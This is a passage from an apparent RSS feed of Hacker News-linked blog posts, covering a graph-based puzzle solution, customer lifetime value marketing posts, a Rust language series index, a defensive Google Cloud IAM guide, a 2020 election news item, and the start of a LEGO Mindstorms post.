<p>In this example, the order is known when number of edges are equal to the number of nodes. <em>Is it that simple? Can we know what the secret number is if the number of edges are equal to the number of nodes?</em></p>
<p>In this example, yes, but it doesn't hold true for the general case. By creating more examples, I start to find a relationship between the number of nodes, and the number of edges. Have a look at what four and five-digit secret numbers look like as a graph:</p>
<p><img src="https://denvaar.github.io/assets/secret_number_4.png" alt=""></p>
<p><img src="https://denvaar.github.io/assets/secret_number_5.png" alt=""></p>
<p>After drawing a few of these, I could begin to see a pattern emerge. As the number of nodes increase, the number of edges increase like, <code>1, 3, 6, 10, 15, 21, 28, ..</code>.</p>
<p>It can be helpful to look for patterns, because it means that there's an equation which can be used to represent some aspect of the problem. Here the pattern showed me what condition to use in order to know when my answer could be considered conclusive. This is the equation that represents that pattern, where n is the number of nodes in the graph.</p>
<p><img src="https://denvaar.github.io/assets/secret_number_6.png"></p>
<h2 id="readingthegraphtofindtheanswer">Reading the graph to find the answer</h2>
<p>A hand-drawn graph helps to visualize the approach of solving this problem, but I knew that I would also need to keep in mind how the graph could be represented with code. Specifically, how to programmatically traverse the graph to produce a result.</p>
<p>After staring at the examples for a bit longer, I realized an obvious and helpful property about the graph.</p>
<p>The nodes with the most outward edges come before those with less outward edges. Additionally, the number of edges for each node differ by exactly one. This means that the first digit of the secret number should have the most outward edges, while the last digit would not have any outward edges.</p>
<p>This property made logical sense to me, and was something that could be easily translated into code.</p>
<h2 id="duplicatedigits">Duplicate digits</h2>
<p>A secret number with more than one of the same digit could cause problems with my approach. This was something that worried me as I was working, because it was not clear how to know which two nodes to put the edge between. For example, take a look at 1030 as the secret number, and imagine the digits given in the following order:</p>
<p><img src="https://denvaar.github.io/assets/secret_number_7.png" alt=""></p>
<p>There are multiple ways to draw the graph because there are two 0's. There should still be only one "correct" way. Creating a correct graph might depend on the order in which the digits are given. I might need to think of some way to backtrack and re-connect nodes in order to end up with the correct graph.</p>
<p>The correct and incorrect graphs can be compared to understand how exactly they differ. The incorrect graph has a circular dependency: 3 comes before both the orange and blue 0's, but then the blue 0 comes before 3, which is contradictory.</p>
<p>Another difference is that the correct version is the only one that satisfies the property mentioned above, where the number of each node's edges differ by exactly one. This property should always be true for any secret number modeled with the graph.</p>
<p><img src="https://denvaar.github.io/assets/secret_number_8.png" alt=""></p>
<p>At this point, I decided to put the question of duplicate digits on hold. It looked like this would break the approach that I had planned to use. I think its possible to figure out, but it was unclear if this use case needed to be supported at all.</p>
<p>My plan was now to turn my ideas into code to see if it would produce the correct answer.</p>
<h2 id="translateideastocode">Translate ideas to code</h2>
<p>This part went by pretty quickly because I had formed a good understanding of the problem, as well as an approach for how to solve it. I picked Python for no particular reason, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://denvaar.github.io/articles/problem_solving_example.html">https://denvaar.github.io/articles/problem_solving_example.html</a></em></p>]]>
            </description>
            <link>https://denvaar.github.io/articles/problem_solving_example.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026561</guid>
            <pubDate>Sun, 08 Nov 2020 15:57:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Average Customer Lifetime Value is not enough]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026559">thread link</a>) | @dthread3
<br/>
November 8, 2020 | https://www.revenueforesight.com/blog | <a href="https://web.archive.org/web/*/https://www.revenueforesight.com/blog">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          <div><div>
	<table id="blogTable">
	<tbody><tr>
	    <td>
	        	<div id="272954475637336152-blog"> 
		<div id="wsite-content">	<div id="blog-post-378967267713861712">
	
	
		
	
		
	
		<div>
				<p><span size="7" color="#5040ae">W</span>hen you think of the demand curve for your business, you imagine a general downward sloping curve.&nbsp; Generally, economic theory would dictate that as you decrease the price, the quantity sold might increase.&nbsp; However, decreasing the price might not be the revenue maximizing action, because things would depend on what economists call the elasticity of the demand.&nbsp; The elasticity of demand is the percentage change in goods demanded for a percentage change in price.&nbsp; If the demand is highly elastic, then lowering prices will raise revenue, but if the demand is highly inelastic, then lowering prices will lower revenue.<br></p>  <p>We see a similar dynamic play out in the Customer's Lifetime Value.&nbsp; Suppose that you were to give a discount to a particular group of customers.&nbsp; Would that raise customer lifetime values so that total revenue is higher, or would it lower customer lifetime values so that total revenue is lower?&nbsp; This is a question that is played out over and over again in the relationship between the customers and the seller.<br></p>  <p>Consider the case with your "best" customer, in terms of generating the highest amount of revenue over their lifetime for your business.&nbsp; If you gave your "best" customer a discount, would that generate more revenue for you over their lifetime for your business, or less?&nbsp; Paradoxically, the answer is that it would most likely generate less revenue.&nbsp; The reason is because at the current prices, their demand is satiated.&nbsp; If you gave them a discount, it would not increase consumption enough to cover the discount.<br></p>  <p>Consider the case of your "worst" customer, in terms of generating the lowest amount of revenue over their lifetime for your business.&nbsp; These are the people who will most likely churn.&nbsp; If you gave these people a discount would they generate more revenue over their lifetime to cover the discount and have a gain, or would they generate less?&nbsp; Unsurprisingly, they would most likely still churn and use your discount, so your business would lose revenue.<br></p>  <p>However, there is a particular class of customers that you currently have, which would most likely grow their consumption given the right incentives.&nbsp; They are the ones that need to be introduced into to new products, or features, or even to help their own businesses grow so that they could consume more.&nbsp; They have the potential to grow into your "best" customers.&nbsp; They are however a very select group that is hard to identify.<br></p>  <p>With our AI software that forecasts future lifetime values we can identify this group easily and help you avoid incentivizing the wrong groups.&nbsp; We are able to see what levels of incentives are necessary to induce changes in behavior and the resulting gains or losses.<br></p>  <div><div> <p><a> <img src="https://www.revenueforesight.com/uploads/1/3/4/4/134486339/clv-presentation3-pic_orig.jpg" alt="Picture"> </a></p> </div></div>  <p>Because we are able to forecast down to individual future purchase values for each customer, you can target only those customers that bring you a net gain.&nbsp; We can even automate this feature for you. &nbsp; Contact us for a demo.<br></p>

		</div>
	
	
			

	
		
	
		
	</div>	<div id="blog-post-895881066272963342">
	
	
		
	
		
	
		<div>
				<p><strong><span size="6" color="#5040ae"><em>W</em></span></strong>e previously covered average lifetime value by looking at actual past purchase lifetimes.&nbsp; There is however an alternative formulation that is widely used that doesn't look necessarily at averaging each individual lifetime value, but instead just uses the averages in customer behavior.&nbsp; Let us elaborate with each formula.<br></p>  <h2><span size="4">The Average Order Size</span><br></h2>  <p>The Average Order size is given by&nbsp; AO = Total Revenue / Number of Orders. This treats all orders from everyone the same, as if they came from each individual equally.<br></p>  <h2><span size="4">The Average Frequency Of Orders</span></h2>  <p>The Average Frequency of Orders is given by AF = Number of Customers / Number of Purchases.&nbsp; This doesn't measure true frequency because you don't know the actual time between purchases.<br></p>  <h2><span size="4">The Average Lifetime</span></h2>  <p>The Average Lifetime is given by AL = sum of Customer Lifetimes / Number of Customers.&nbsp; However, because you can't necessarily wait 20 years to see the total customer lifetimes, it is sometimes suggested to use 1 / churn rate percentage to estimate this value.<br></p>  <h2><span size="4">The Average Customer Lifetime Value</span></h2>  <p>The Average Customer Lifetime Value is then given by AvgCLV = AO*AF*AL.&nbsp; It is just the previous formulas multiplied with each other to get the "average" in lifetime value.<br></p>  <h2><span size="4">Correlated Values and Problems with using the "<em>Average</em>"</span><br></h2>  <p>The above formula, while simple, has a few glaring flaws that are not fixable.&nbsp; Customers don't behave like the average, and the "average" lifetime value will be terribly misleading.&nbsp; When you multiple the averages together, you assume that each factor AO, AF,&nbsp; and AL are statistically independent.&nbsp;&nbsp; They are not.&nbsp; When the customer is a high lifetime value customer, the Average Order sizes are larger, the Average Frequency is greater, and the Average Lifetime is greater, for example.&nbsp; When the customer is a low lifetime value customer, the Average Order sizes are smaller, the Average Frequency is less, and the Average Lifetime is shorter, for example.<br></p>  <p>Let's work through an example where we can see the effect of correlation on the "average" lifetime value.&nbsp; For simplicity, assume the correlation is perfect, which won't be too far from the actual case.&nbsp; These numbers come from a Starbucks case study.&nbsp; For Starbucks, the average frequency is AF = 4.2 visits per week.&nbsp; The average order size is AO = $4.05 per visit.&nbsp; The estimated lifetime is 20 years, so AL = 52 weeks * 20 years.&nbsp; This gives the Average Customer Lifetime Value as<br></p>  <p>AvgCLV = $4.05*4.2*52*20 = $17,690.40<br></p>  <p>We can look at the correlation effect as equivalent to adding an extra term inside the formula for Average Customer Lifetime Value</p>  <p>AvgCLV = (AO+x)(AF+x)(AL+x)</p>  <p>When a customer is high lifetime value customer, x is added to all the base values.&nbsp; When a customer is a low lifetime value customer, you can think of subtracting x from all the base values.&nbsp; Now let us look at what happens to the Starbucks customer when they are a high value lifetime customer by assuming it raises all the values by 20%.<br></p>  <p>HighAvgCLV = ($4.05*1.2)*(4.2*1.2)*(52*20*1.2) = $ 30,569.01<br></p>  <p>This value is almost twice the baseline. And let's look similarly at what happens when the Starbucks customer is a low value lifetime customer by lowering all the values by 20%.<br></p>  <p>LowAvgCLV = ($4.05*0.8)*(4.2*0.8)*(52*20*0.8) = $9,057.48<br></p>  <p>This value is almost half the baseline value.&nbsp; High and Low value customers might not be a problem with there were an equal number of both types, but if you recall the L-Shaped distribution from the previous post on "Why The Average Customer Lifetime Value is Not Enough", the majority of customers come from the low value of the distribution with a long tail, since roughly 80% of revenue is generated by only 20% of the customers.<br></p>  <div><div> <p><a> <img src="https://www.revenueforesight.com/uploads/1/3/4/4/134486339/clv-presentation-4-001_orig.png" alt="Picture"> </a></p> </div></div>  <p>The real-world effect of correlation on the terms in the "average" lifetime value AvgCLV = AO*AF*AL, is to make the calculation highly biased and misleading by making the L-shaped distribution have greater extremes in the tails and making it more L-shaped.&nbsp;&nbsp; When the true lifetime value of customers affects the profitability of your business, you cannot depend on the "average" formulas. Given that there is a cost to acquiring customers (through ads and incentives), then knowing the true lifetime values is a key piece of information that you need for your business.<br></p>  <p>We can help you with discovering what the true lifetime value is of each and every customer in your business, because we have AI software that forecasts what each individual customer's lifetime value will be, and what their stream of future purchase values will be, with high accuracy, early in their life.&nbsp; Contact us for a demo.<br></p>

		</div>
	
	
			

	
		
	
		
	</div>	<div id="blog-post-898714202450837069">
	
	
		
	
		
	
		<div>
				<div><p><span size="7" color="#5040ae"><em><strong>A</strong></em></span> lot of e-commerce advice sites will suggest you look at customer lifetime value by their average.&nbsp; The average value however will be very misleading and may cause you to make terrible decisions on acquiring customers.</p><p>Let's examine why the average lifetime value is highly misleading.&nbsp; Below is a graph of customer lifetime purchase values ordered by customer.&nbsp; It is a familiar L-shaped distribution with long tails.</p></div>  <div><div> <p><a> <img src="https://www.revenueforesight.com/uploads/1/3/4/4/134486339/clv-presentation2-pic_orig.jpg" alt="Picture"> </a></p> </div></div>  <p>This distribution becomes more L-shaped as more customers are added.&nbsp; It never becomes the shape of a normal Gaussian distribution that everyone is familiar with, which is a symmetric bell-shaped distribution with 2 sides.<br></p>  <h2><span size="5">The 80/20 rule</span><br></h2>  <p>There is a rule of thumb for business that roughly 80% of the revenues are driven by 20% of the customers. (In actually it is closer to 73-76%).&nbsp; Let's see what kind of implications such an extreme distribution has on the average customer lifetime value.</p>  <p>Let's begin with some round numbers.&nbsp; Say $80 million of lifetime revenue is generated by 20 customers.&nbsp; The rest of the 80 customers only generate $20 million of lifetime revenue.&nbsp;&nbsp; This makes the average lifetime revenue generated to be $4m*20% + $0.25m*80% = $1 million lifetime revenue on average per customer (out of 100 customers and $100m revenue).&nbsp; From the high revenue generating group the average is $4 million per customer.&nbsp; From the low revenue generating group the average is $0.25 million per customer. &nbsp;<br></p>  <p>Now for the sake of simplicity, assume that the Cost of Acquisition of&nbsp; each Customer (<strong>CAC</strong>) is $1 million, or close to it because you are basing decisions on the average lifetime revenue generated by each customer.&nbsp;&nbsp; Then for 20 customers, you are profitable by $3 million, but for 80 customers you are losing $0.75million, each.<br></p>  <p>As you scale your business, it is more likely that you will add customers who are unprofitable.&nbsp;&nbsp; The tail of the L-shaped distribution becomes more extreme, and what you thought was the average lifetime revenue of $1 million 6 months ago, is now only $0.5 million on average.&nbsp; You will not know this is changing because it takes a while to realize that new customer lifetime values are lower than before.&nbsp; This could be disastrous if you kept the $1 million per Customer Acquisition Cost.&nbsp; …</p></div></div></div></div></td></tr></tbody></table></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.revenueforesight.com/blog">https://www.revenueforesight.com/blog</a></em></p>]]>
            </description>
            <link>https://www.revenueforesight.com/blog</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026559</guid>
            <pubDate>Sun, 08 Nov 2020 15:57:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making a programming language using Rust]]>
            </title>
            <description>
<![CDATA[
Score 182 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25026419">thread link</a>) | @azhenley
<br/>
November 8, 2020 | https://arzg.github.io/lang/ | <a href="https://web.archive.org/web/*/https://arzg.github.io/lang/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A series about making a programming language called <a href="https://github.com/arzg/eldiro">Eldiro</a> using the <a href="https://rust-lang.org/">Rust</a> programming language.</p><p><a href="https://arzg.github.io/lang/9/">Part Nine: Function Calls</a></p><p><a href="https://arzg.github.io/lang/8/">Part Eight: Function Definitions</a></p><p><a href="https://arzg.github.io/lang/7/">Part Seven: A REPL</a></p><p><a href="https://arzg.github.io/lang/6/">Part Six: Blocks</a></p><p><a href="https://arzg.github.io/lang/5/">Part Five: Binding Usages</a></p><p><a href="https://arzg.github.io/lang/4/">Part Four: Backtracking</a></p><p><a href="https://arzg.github.io/lang/3/">Part Three: Defining Variables</a></p><p><a href="https://arzg.github.io/lang/2/">Part Two: Whitespace Support</a></p><p><a href="https://arzg.github.io/lang/1/">Part One: A Basic Parser</a></p><p><a href="https://arzg.github.io/lang/0/">Part Zero: Getting set up</a></p></div></div>]]>
            </description>
            <link>https://arzg.github.io/lang/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026419</guid>
            <pubDate>Sun, 08 Nov 2020 15:41:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Cloud IAM for Security Teams]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026227">thread link</a>) | @gbrindisi
<br/>
November 8, 2020 | https://cloudberry.engineering/article/google-cloud-iam-security-guide/ | <a href="https://web.archive.org/web/*/https://cloudberry.engineering/article/google-cloud-iam-security-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <p>Identity and Access Management (IAM) is an important piece of the cloud puzzle and it’s usually a source of headaches from a security point of view. Let’s try to give some pointers from a blue team perspective.</p>

<p>If you are a security team that just inherited a bunch of Google Cloud Platform (GCP) accounts, this guide is for you.</p>

<h2 id="identities-and-roles">Identities and Roles</h2>

<p>IAM revolves around the concept of <strong>identity</strong>: an (authenticated) entity to which authorization grants are applied.</p>

<h3 id="members">Members</h3>

<p>In Google Cloud, identities are called <strong>members</strong> and are the following:</p>

<ul>
<li>A <strong>User</strong>: defined by a Google Account</li>
<li>A <strong>Group</strong>: defined by a Google Group</li>
<li>A <strong>domain</strong>: a super group representing all accounts under a gsuite/workspace domain</li>
<li>A <strong>Service Account</strong>: an account for an application rather than an end user</li>
</ul>

<p>To make things spicier, there are also two special members that you are going to hate and you want to make sure they will <em>never be used</em> (unless valid business reasons):</p>

<ul>
<li><strong>allAuthenticatedUsers</strong>: a special group comprised of everyone on earth with a google account (yes)</li>
<li><strong>allUser</strong>: anyone on the internet, authenticated or not</li>
</ul>


<div><p>
Pro Tip:</p>

<ul>
<li>scan your IAM policies and make sure that <code>allAuthenticatedUsers</code> and <code>allUsers</code> are never used</li>
<li>or even better, set up an organizational policy to only allow members from your gsuite/workspace domain</li>
</ul>
</div>


<h3 id="roles">Roles</h3>

<p>You assign (bind) a Role to a Member to grant that identity access to a resource. An example role is  <code>resourcemanager.projectCreator</code>:</p>

<pre><code>$ gcloud iam roles list
…
---
description: Access to create new GCP projects.
etag: AA==
name: roles/resourcemanager.projectCreator
stage: GA
title: Project Creator
---
…
</code></pre>

<p>Roles are a set of <em>permissions</em> grouped together, each one representing a fine grained operation. You can’t assign permissions directly to members.</p>

<p>An example permission would be <code>resource manager.projects.create</code>:</p>

<pre><code>$ gcloud iam roles describe roles/resourcemanager.projectCreator
description: Access to create new GCP projects.
etag: AA==
includedPermissions:
- resourcemanager.organizations.get
- resourcemanager.projects.create
name: roles/resourcemanager.projectCreator
stage: GA
title: Project Creator
</code></pre>

<p>Usually, every cloud service will come with a dedicated set of Roles (<a href="https://cloudberry.engineering/article/stricter-access-control-to-gcr/">not for Google Container Registry</a>).</p>

<h3 id="custom-roles">Custom Roles</h3>

<p>As a rule of thumb <strong>stick to standard roles</strong>, but if you have to bind a role to a member in a high level policy you might want to <a href="https://cloud.google.com/iam/docs/creating-custom-roles">use a custom role</a>. Custom Roles allows you to group together the specific set of permissions you need.</p>

<p>They are helpful to maintain least privilege because a role bind on a high level policy (like the Organization one) will affect way more resources.</p>


<div><p>
Pro Tip:</p>

<ul>
<li>Use standard roles when the number of affected resources is limited</li>
<li>Use custom roles when the authorization grant affect too many resources</li>
</ul>
</div>


<h3 id="primitive-roles">Primitive Roles</h3>

<p>There are a bunch of roles you should be wary of: <em>primitive roles</em>. These are <code>Owner</code>, <code>Editor</code> and <code>Viewer</code>. When they are bind on the Project IAM policy they translate to admin, write and read access to everything inside that project.</p>

<p>You want to be wary for two reasons:</p>

<ol>
<li>The set of permissions change over time: when Google release new cloud services, permissions for such services are included in the primitive roles. This means <strong>you have an authorization grant that change over time and you have no control over</strong>. No bueno.</li>
<li><strong>They are a bridge to <a href="https://cloud.google.com/storage/docs/access-control/lists">Access Control List</a></strong> (ACL). ACL are the legacy authorization system for some storage services such as Buckets and Bigquery. In such resources you can assign ACL grants to whoever is bind to a primitive role in the Project. This relationship <strong>adds complexity when trying to understand the <a href="https://cloudberry.engineering/article/lateral-movement-cloud/">blast radius</a></strong> of a member.</li>
</ol>

<p>If you can’t escape using a primitive role, bind them to members that you will use only in “break the glass” scenarios. In practice, you don’t want a team doing their day to day operations as <code>Owners</code>.</p>


<div><p>
Pro Tip:</p>

<ul>
<li>Avoid primitive roles</li>
<li>Do not use Access Control Lists (ACL)</li>
</ul>
</div>


<h2 id="iam-policies-and-where-to-find-them">IAM Policies (and where to find them)</h2>

<p>Roles are bind to members in an IAM Policy. Policies are organized in hierarchical layers (from top to bottom):</p>

<ul>
<li><strong>Organization</strong></li>
<li><strong>Folder</strong></li>
<li><strong>Project</strong></li>
<li>Specific Resources.</li>
</ul>

<p>Bindings will be inherited from top to bottom.</p>

<p>So if you assign <code>Storage Admin</code> to a service account in the Organization IAM Policy, the same grant will be applied to everything down (don’t do that).</p>

<p>You obviously want to be extra careful when binding roles high in the hierarchy as the authorization grant will be quite large. That’s why it’s a good idea to use custom roles to shrink it to just the permissions you need.</p>

<p>Some specific cloud resources, such as Buckets, have their own IAM policy. These are easy to overlook because they don’t have a consistent place in the google cloud admin interface.</p>

<p>The best way to <strong>get visibility over all IAM policies</strong> is to <a href="https://cloud.google.com/asset-inventory/">create a Cloud Asset Inventory (CAI) dump</a>. CAI is, in my opinion, <strong>the most useful thing in GCP</strong>. It’s an API that will generate a json (or bigquery) dump of all the resources and IAM Policies you are currently running.</p>

<p>The best thing you can do on day one is to set up periodical CAI dumps, and then build your detections on top of them.</p>

<h3 id="maintain-the-principle-of-least-privilege">Maintain the principle of least privilege</h3>

<p>The second best thing is to <a href="https://cloud.google.com/iam/docs/recommender-overview">use the IAM Recommender</a>: a service that monitors how role bindings are actually used to make sure you are not over granting them.</p>

<p>Another helpful trick to know is that you can <a href="https://cloud.google.com/iam/docs/conditions-overview">attach conditions to role bindings</a>. For example you can set an expiration time, or you can scope down the binding to affect only certain resources matching a pattern.</p>


<div><p>
Pro Tip:</p>

<ul>
<li>The higher in the IAM hierarchy, the wider the scope of the authorization grant: use sporadically, be a gatekeeper.</li>
<li>Set up Cloud Asset Inventory to not miss anything</li>
<li>Use the IAM Recommender</li>
<li>Use IAM Conditions</li>
</ul>
</div>


<h2 id="notes-on-service-accounts">Notes on Service Accounts</h2>

<p>Service accounts can be of two types: google managed and user managed.</p>

<p>A user managed service account is one you manually create. To use it, you need to create a private key and embed it into your application. A service account can have multiple keys.</p>

<p><strong>Service Account keys lifecycle is your responsibility</strong>: they never really expires, are hard to audit (you don’t see which key has been used from the audit logs). From day one you should start thinking how to keep track of them.</p>

<p>Personally I am a fan of wrapping keys creation into an internal service for your developers to use, but I understand it’s not always possible.</p>

<p>The best alternative is to <strong>use google managed service accounts</strong>. For example each project will come with a default service account that is used by Google Compute Engine (GCE) services (if the GCE API is enabled).</p>

<p>This means that virtual machines will transparently be identified by that service account, and they are authorized to request short-lived authorization tokens from the internal metadata service. You can configure them to use a service account of your choice and <strong>no keys are involved</strong>.</p>


<div><p>
Pro tip:</p>

<ul>
<li>Become a gatekeeper for provisioning Service Accounts keys</li>
<li>Use the identity of the virtual machines whenever possible</li>
<li>Are you running Google Kubernetes Engine (GKE)? Take a look at <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a></li>
<li>Follow <a href="https://cloudberry.engineering/article/google-cloud-service-accounts-security-best-practices/">service accounts best practices</a></li>
</ul>
</div>


<h2 id="conclusion">Conclusion</h2>

<p>To recap:</p>

<ul>
<li>scan your IAM policies and make sure that <code>allAuthenticatedUsers</code> and <code>allUsers</code> are never used</li>
<li>or even better, set up an organizational policy to only allow members from your gsuite/workspace domain</li>
<li>Use standard roles when the number of affected resources is limited</li>
<li>Use custom roles when the authorization grant affect too many resources</li>
<li>Avoid primitive roles</li>
<li>Do not use Access Control Lists (ACL)</li>
<li>The higher in the IAM hierarchy, the wider the scope of the authorization grant: use sporadically, be a gatekeeper.</li>
<li>Set up Cloud Asset Inventory to not miss anything</li>
<li>Adhere to the least privilege principle with the IAM Recommender and IAM Conditions</li>
<li>Become a gatekeeper for provisioning Service Accounts keys</li>
<li>Use the identity of the virtual machines whenever possible</li>
<li>Are you running Google Kubernetes Engine (GKE)? Take a look at <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a></li>
<li>Follow <a href="https://cloudberry.engineering/article/google-cloud-service-accounts-security-best-practices/">service accounts best practices</a></li>
</ul>

<p>There is a lot more to say about IAM governance and security best practices. This article’s purpose is to give a high level overview of the main security considerations.</p>

<p>If you are looking for specific advices, <a href="mailto:hello@cloudberry.engineering">let me know</a>. I might have some.</p>

<p>Finally, I highly recommend this <a href="https://www.youtube.com/watch?v=YGT_AmCA-eA&amp;feature=youtu.be">fantastic talk by Kat Traxler</a> about primitive roles and IAM quirks in GCP.</p>
        </div>
        
    </div>
</section></div>]]>
            </description>
            <link>https://cloudberry.engineering/article/google-cloud-iam-security-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026227</guid>
            <pubDate>Sun, 08 Nov 2020 15:13:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[South Ayrshire Golf club owner loses 2020 presidential election]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25026202">thread link</a>) | @gnufx
<br/>
November 8, 2020 | https://www.ayrshiredailynews.co.uk/post/south-ayrshire-golf-club-owner-loses-2020-presidential-election | <a href="https://web.archive.org/web/*/https://www.ayrshiredailynews.co.uk/post/south-ayrshire-golf-club-owner-loses-2020-presidential-election">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.3.0"><div dir="ltr"><div><p id="viewer-8j2hn"><span>Donald Trump, a South Ayrshire golf club owner has lost the 2020 presidential election to Joe Biden, after running again to be re-elected for a second presidential term.</span></p><div id="viewer-2nsni"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label=""><p><img data-pin-url="https://www.ayrshiredailynews.co.uk/post/south-ayrshire-golf-club-owner-loses-2020-presidential-election" data-pin-media="https://static.wixstatic.com/media/bc51f5_8bc1fa53ac3f4237b0037c9490c6fb37~mv2.jpg/v1/fit/w_1000%2Ch_637%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/bc51f5_8bc1fa53ac3f4237b0037c9490c6fb37~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt=""></p></div><p><span dir="auto">Pic - Northwest Public Broadcasting </span></p></div></div></div><p id="viewer-1nsvc"><span>Donald Trump, currently the 45th president who also owns the Trump Turnberry golf course in South Ayrshire, Scotland has lost the 2020 presidential race to Joe Biden It’s been confirmed.</span></p><p id="viewer-42nml"><span><span>Biden is projected to win Pennsylvania, Arizona &amp; Georgia taking him well over the 270 needed to win the US election and the win for Joe was projected by CNN earlier this afternoon (UK Time).</span></span></p><p id="viewer-b9m6j"><span>Donald who is currently the 45th US president has now lost to Joe Biden who is projected at 290 vs Trumps projected 214 with Joe Biden now set to become the 46th US president.</span></p><p id="viewer-85of6"><span>Donald Trump has however vowed to contest the election in the Supreme Court after saying the election was a fraud, and rigged by the Democrats after loosing his big majorities in states like Pennsylvania &amp; Georgia to postal votes which have been counted over the past several days. </span></p><p id="viewer-3fp2h"><span>Trump has also repeated his unfounded claims that poll watchers were not allowed into ballot counting rooms to observe.&nbsp;</span></p><p id="viewer-1r2l8"><span>Election officials have however said that both Republican and Democrat poll watchers were able to watch the process, and have rubbished claims of unfairness.&nbsp;</span></p><blockquote id="viewer-csnc2"><span><strong><em>Donald Trump tweeted the following earlier after hearing Biden was projected to win the election:</em></strong></span></blockquote><p id="viewer-52uur"><span><span>"THE OBSERVERS WERE NOT ALLOWED INTO THE COUNTING ROOMS. I WON THE ELECTION, GOT 71,000,000 LEGAL VOTES. BAD THINGS HAPPENED WHICH OUR OBSERVERS WERE NOT ALLOWED TO SEE. NEVER HAPPENED BEFORE. MILLIONS OF MAIL-IN BALLOTS WERE SENT TO PEOPLE WHO NEVER ASKED FOR THEM!"</span></span></p><p id="viewer-6b0kl"><span><span>"71,000,000 Legal Votes. The most EVER for a sitting President!"</span></span></p><blockquote id="viewer-dk8em"><span><span><strong>Donald Trump also issued the following statement this afternoon:</strong></span></span></blockquote><p id="viewer-ef707"><span>"Beginning Monday, our campaign will start prosecuting our case in court to ensure election laws are fully upheld and the rightful winner is seated," he added.</span></p><p id="viewer-7m3av"><span>"I will not rest until the American people have the honest vote count they deserve and that democracy demands."</span></p><blockquote id="viewer-162q3"><span><span><strong>Joe Biden also issued statement this afternoon after finding out he had won the US Election:</strong></span></span></blockquote><p id="viewer-ao2b6"><span>"America, I’m honored that you have chosen me to lead our great country.</span></p><p id="viewer-85u1p"><span>The work ahead of us will be hard, but I promise you this: I will be a President for all Americans — whether you voted for me or not."</span></p><p id="viewer-5akrg"><span>"I will keep the faith that you have placed in me."</span></p><p id="viewer-ceo50"><span><span>Joe Biden is also expected to give a speech in the early hours of tomorrow morning at around 1AM UK Time.</span></span></p><p id="viewer-cfvr0"><span><span><em><strong>PM Boris Johnson also congratulated Joe Biden on his win</strong></em></span></span></p><div id="viewer-bq7va"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.ayrshiredailynews.co.uk/post/south-ayrshire-golf-club-owner-loses-2020-presidential-election" data-pin-media="https://static.wixstatic.com/media/bc51f5_3155158b89b94139b5a3131dfeb4df65~mv2.jpg/v1/fit/w_680%2Ch_383%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/bc51f5_3155158b89b94139b5a3131dfeb4df65~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.ayrshiredailynews.co.uk/post/south-ayrshire-golf-club-owner-loses-2020-presidential-election</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026202</guid>
            <pubDate>Sun, 08 Nov 2020 15:09:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BGP Lego Bricks]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25026189">thread link</a>) | @bitcynth
<br/>
November 8, 2020 | https://blog.cynthia.re/post/bgp-lego | <a href="https://web.archive.org/web/*/https://blog.cynthia.re/post/bgp-lego">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h3>Nov 8 2020</h3>


<p>Since I was 7 years old, I have wanted a LEGO Mindstorms robot. I will admit that in the later years it was mainly that I wanted to prove to myself that I got somewhere as it seemed so infinitely expensive back when I was younger…</p>

<p><a href="https://twitter.com/bitcynth/status/1319956429252513792" title="Tweet about it"><img src="https://blog.cynthia.re/asset/g1ZkG7sMAD" alt="LEGO Robot Inventor"></a></p>

<p>Well I finally got one!</p>

<p>I knew this thing had some capability to run <a href="https://micropython.org/">MicroPython</a> since that was mentioned in the product description quite predominantly, which sounded like a pretty hackable platform.</p>

<p>However, shortly after opening the box, I realized that this wasn’t at all just an update to the <a href="https://www.lego.com/en-us/product/lego-mindstorms-ev3-31313">Mindstorms EV3</a>. Apparently the Robot Inventor was a slightly more expensive thing with less features and using a LiPo battery instead of AA cells.</p>

<p>Luckily I ordered it via the store’s website which means that by law I can return it within 14 days for any reason, and it allows me to open the box for inspection.</p>

<p>So after convincing some stubborn store employee that this is not a consumable product (which would remove my right to open the box), I got it returned and ordered the EV3.</p>

<p>Then two days later I finally had the thing which I have wanted for so long.</p>

<p>While I was waiting for the EV3, I was looking around at how it did MicroPython as it had this paragraph on the downloads page.</p>

